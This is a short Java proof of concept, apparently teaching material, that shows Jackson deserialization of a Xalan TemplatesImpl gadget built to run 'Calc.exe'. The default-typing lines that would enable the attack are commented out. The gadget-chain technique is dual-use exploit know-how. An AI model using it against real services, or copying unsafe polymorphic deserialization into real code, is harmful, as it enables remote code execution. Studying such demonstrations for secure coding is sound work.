// The MIT License (MIT)
// Copyright (c) 2017 Moritz Bechler
// Copyright (c) 2018 Robert C. Seacord
//
// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in all
// copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE.

package jackson;

import com.fasterxml.jackson.core.JsonProcessingException;
import com.fasterxml.jackson.databind.ObjectMapper;

import javassist.*;

import java.io.IOException;
import java.lang.reflect.InvocationTargetException;
import java.util.Properties;

public class Cage {

  private static String marshal(Object o) throws JsonProcessingException {
    ObjectMapper mapper = new ObjectMapper();
   // mapper.enableDefaultTyping();
    return mapper.writeValueAsString(o);
  }

  private static Object unmarshal(String data) throws IOException {
    ObjectMapper mapper = new ObjectMapper();
  //  mapper.enableDefaultTyping();
    return mapper.readValue(data, Object.class);
  }

    public static void main(String[] args) throws
        IllegalAccessException, ClassNotFoundException, InstantiationException, CannotCompileException,
        NotFoundException, IOException, NoSuchFieldException, NoSuchMethodException, InvocationTargetException {
    Properties props = System.getProperties();
    props.setProperty("upstreamXalan", "true");

    String[] command = {"Calc.exe"};
    Object tpl = TemplatesUtil.createTemplatesImpl(command);
    Object obj = unmarshal(marshal(tpl));
    System.out.println(obj);
  }

} // end class Cage
